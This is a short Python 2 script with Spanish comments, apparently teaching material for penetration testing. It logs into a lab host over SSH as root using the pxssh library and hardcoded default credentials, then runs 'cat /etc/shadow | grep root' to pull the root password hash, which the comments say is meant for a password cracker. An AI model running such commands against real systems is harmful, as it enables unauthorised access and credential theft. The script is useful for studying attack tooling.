# Pxssh es un script especializado en ssh que esta incluido en la libreria
# pxssh. Incorpora las capacidades de dialogo directo con el servidor de ssh
# mediante funciones como login(), logout() o prompt()
import pxssh

# Posibles PROMPTs que nos podemos encontrar.
PROMPT = ['# ', '>>> ', '> ', '\$ ']

# Funcion a traves de la cual podemos enviar un comando
def sendCommand(s, cmd):	
	s.sendline(cmd)
	s.prompt()
	print s.before

# Funcion que se encarga de la conexion. Le pasamos como parametro los datos
# de acceso, usuario, host y password.
def connect(user, host, password):
	try:
		# Usamos 
		s = pxssh.pxssh()
		s.login(host, user, password)
		return s
	except:
		print '[-] Error Connecting'
		exit(0)

# Funcion principal.
def main():
	host = '192.168.0.211'
	user  = 'root'
	password = 'toor'
	# Nos conectamos por ssh y recuperamos el proceso que ha realizado dicha 
	# conexion.
	child = connect(user, host, password)	
	# Hacemos un cat sobre el fichero /etc/shadow del host remoto y extraemos
	# la linea del password. Esta informacion, posteriormente se la podemos
	# pasar al crackeador :-p
	sendCommand(child, 'cat /etc/shadow | grep root')

if __name__ == '__main__':
	main()